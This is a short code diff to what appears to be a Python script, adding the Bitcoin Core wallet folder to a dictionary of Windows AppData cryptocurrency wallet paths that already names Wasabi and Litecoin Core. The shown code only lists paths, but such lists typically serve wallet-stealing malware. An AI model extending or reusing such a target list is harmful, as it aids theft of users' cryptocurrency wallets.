@@ -34,7 +34,9 @@ paths = {
 
     r'Roaming\WalletWasabi\Client\Wallets':'Wallet Wasabi',
 
-    r'Roaming\Litecoin\wallets': 'Litecoin Core'
+    r'Roaming\Litecoin\wallets': 'Litecoin Core',
+
+    r'Roaming\Bitcoin\wallets': 'Bitcoin Core'
 }
 
 
